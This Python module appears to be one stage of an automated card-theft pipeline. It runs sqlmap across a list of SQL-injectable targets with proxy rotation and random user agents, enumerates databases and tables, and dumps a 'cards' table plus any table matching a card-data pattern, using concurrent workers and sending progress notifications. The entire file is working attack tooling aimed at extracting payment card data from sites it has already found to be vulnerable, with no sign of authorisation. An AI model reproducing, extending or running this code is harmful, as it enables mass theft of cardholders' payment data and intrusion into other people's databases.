"""Stage 3 — database dumping. enumerate dbs, tables, columns, extract card data.

Modes (run(mode=...)):
  "dump"   — full dump, concurrent across N workers (cfg["dump"]["workers"], default 4).
             each worker gets its own data/dumps/worker_{i} subdir.
  "dbs"    — sqlmap --dbs enumeration -> data/raw/dbs.txt
  "tables" — sqlmap --tables enumeration -> data/raw/tables.txt
"""
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import re
from modules.utils import run, which
from modules.notifier import Notifier


class Dumper:
    def __init__(self, cfg, logger):
        self.cfg = cfg
        self.log = logger
        self.raw = Path(cfg["paths"]["raw"])
        self.dumps = Path(cfg["paths"]["dumps"])
        self.rc = cfg["dump"]
        self.sq = cfg["sqli"]

    def _proxy_cli_args(self):
        """optional proxy rotation — never crash if module is missing."""
        try:
            from modules.proxies import ProxyPool
            return ProxyPool(self.cfg, self.log).sqlmap_args()
        except Exception:
            return []

    def _base_cmd(self, targets_file: Path, out_dir=None):
        cmd = [
            self.sq["sqlmap_bin"],
            "-m", str(targets_file),
            "--batch",
            f"--output-dir={out_dir or self.dumps}",
        ]
        if self.sq.get("random_agent"):
            cmd.append("--random-agent")
        cmd += self._proxy_cli_args()
        return cmd

    @staticmethod
    def _parse_available(out: str, what: str) -> list:
        """parse sqlmap 'available <what> [N]:' sections -> listed names."""
        names, active = [], False
        for line in out.splitlines():
            m_sec = re.match(r"available (\w+)", line.strip().lower())
            if m_sec:
                active = (m_sec.group(1) == what)
                continue
            if not active:
                continue
            m = re.match(r"\[\*\]\s+(\S+)", line.strip())
            if m:
                name = m.group(1).strip()
                if name and "@" not in name and name.lower() not in (
                        "starting", "ending"):
                    names.append(name)
        return list(dict.fromkeys(names))  # dedupe, keep order

    # system databases carry no user data — skip their tables
    _SYSTEM_DBS = frozenset(
        {"information_schema", "mysql", "performance_schema", "sys"})

    @classmethod
    def _parse_tables(cls, out: str) -> list:
        """parse sqlmap '--tables' output.

        --tables lists tables per database as 'Database: <name>' headers
        followed by '| name |' pipe rows — NOT the 'available tables' /
        '[*] name' style that --dbs uses, so _parse_available can't see them.
        """
        tables, current_db = [], None
        for line in out.splitlines():
            s = line.strip()
            m_db = re.match(r"Database:\s*(\S+)", s, re.I)
            if m_db:
                current_db = m_db.group(1)
                continue
            m_row = re.match(r"\|\s*([^|]+?)\s*\|$", s)
            if m_row and current_db:
                name = m_row.group(1).strip()
                if name and current_db.lower() not in cls._SYSTEM_DBS:
                    tables.append(name)
        return list(dict.fromkeys(tables))  # dedupe, keep order

    # ------------------------------------------------------- enum modes
    def _enum_dbs(self, targets_file: Path):
        cmd = self._base_cmd(targets_file) + ["--dbs"]
        self.log.info("[dumper] enumerating databases (--dbs)")
        rc, out, err = run(cmd, logger=self.log)
        dbs = self._parse_available(out, "databases") if rc == 0 else []
        (self.raw / "dbs.txt").write_text("\n".join(sorted(dbs)))
        self.log.info(f"[dumper] {len(dbs)} databases -> data/raw/dbs.txt")
        Notifier(self.cfg, self.log).send(
            f"*[dbs done]*\ndatabases: {len(dbs)}", stage="dump")

    def _enum_tables(self, targets_file: Path):
        cmd = self._base_cmd(targets_file) + ["--tables"]
        self.log.info("[dumper] enumerating tables (--tables)")
        rc, out, err = run(cmd, logger=self.log)
        tables = self._parse_tables(out) if rc == 0 else []
        (self.raw / "tables.txt").write_text("\n".join(sorted(tables)))
        self.log.info(f"[dumper] {len(tables)} tables -> data/raw/tables.txt")
        Notifier(self.cfg, self.log).send(
            f"*[tables done]*\ntables: {len(tables)}", stage="dump")

    # ------------------------------------------------------- dump mode
    def _dump_chunk(self, idx: int, chunk: list, kill_file: Path):
        """dump one target chunk into data/dumps/worker_{idx}/."""
        if kill_file.exists():
            self.log.warning(f"[dumper] worker {idx}: /kill before start — skip")
            return None
        chunk_file = self.raw / f".dump_chunk_{idx}.txt"
        chunk_file.write_text("\n".join(chunk))
        subdir = self.dumps / f"worker_{idx}"
        subdir.mkdir(parents=True, exist_ok=True)
        try:
            self._dump_db(chunk_file, subdir)
            if kill_file.exists():
                self.log.warning(
                    f"[dumper] worker {idx}: /kill — partial dump kept")
                return subdir
            self._dump_tables(chunk_file, subdir, kill_file)
        finally:
            chunk_file.unlink(missing_ok=True)
        return subdir

    def _dump_concurrent(self, targets_file: Path):
        try:
            workers = max(1, int(self.rc.get("workers", 4) or 4))
        except (TypeError, ValueError):
            workers = 4
        targets = [t.strip() for t in targets_file.read_text().splitlines()
                   if t.strip()]
        # interleave so slow targets spread across workers
        chunks = [c for c in (targets[i::workers] for i in range(workers)) if c]
        kill_file = self.raw / ".kill"
        self.log.info(
            f"[dumper] dumping {len(targets)} targets, {len(chunks)} workers")
        with ThreadPoolExecutor(max_workers=len(chunks)) as ex:
            futs = {ex.submit(self._dump_chunk, idx, chunk, kill_file): idx
                    for idx, chunk in enumerate(chunks)}
            for fut in as_completed(futs):
                idx = futs[fut]
                try:
                    subdir = fut.result()
                    self.log.info(f"[dumper] worker {idx} done -> {subdir}")
                except Exception as e:
                    self.log.error(f"[dumper] worker {idx} failed: {e}")
        Notifier(self.cfg, self.log).send(
            "*[dump done]* — check data/dumps/worker_*/", stage="dump")

    def _dump_db(self, targets_file: Path, out_dir: Path):
        cmd = self._base_cmd(targets_file, out_dir)
        cmd.append(f"-D{self.rc['target_db']}")
        cmd.append("-Tcards")
        cmd.append("--dump")
        for col in self.rc["dump_columns"]:
            cmd.append(f"-C{col}")
        self.log.info(f"[dumper] dumping {self.rc['target_db']}.cards")
        rc, out, err = run(cmd, logger=self.log)
        self.log.info(f"[dumper] dump rc={rc}")

    def _dump_tables(self, targets_file: Path, out_dir: Path, kill_file: Path):
        # discover tables matching card pattern
        cmd = self._base_cmd(targets_file, out_dir)
        cmd.append(f"-D{self.rc['target_db']}")
        cmd.append("--tables")
        rc, out, err = run(cmd, logger=self.log)
        if rc != 0:
            return
        pattern = re.compile(self.rc["card_tables_regex"], re.I)
        tables = [t.strip() for t in out.splitlines() if pattern.search(t)]
        self.log.info(f"[dumper] matched {len(tables)} card-bearing tables")

        for table in tables:
            if kill_file.exists():
                self.log.warning("[dumper] /kill — stopping table dumps")
                break
            cmd = self._base_cmd(targets_file, out_dir)
            cmd.append(f"-D{self.rc['target_db']}")
            cmd.append(f"-T{table}")
            cmd.append("--dump")
            self.log.info(f"[dumper] dumping table: {table}")
            run(cmd, logger=self.log)

    # ------------------------------------------------------------------ run
    def run(self, mode="dump"):
        targets_file = self.raw / "injectable.txt"
        if not targets_file.exists() or not targets_file.read_text().strip():
            self.log.error("[dumper] no injectable.txt")
            return

        if not which(self.sq["sqlmap_bin"]):
            self.log.error("[dumper] sqlmap not found")
            return

        if mode == "dbs":
            self._enum_dbs(targets_file)
        elif mode == "tables":
            self._enum_tables(targets_file)
        else:
            self._dump_concurrent(targets_file)
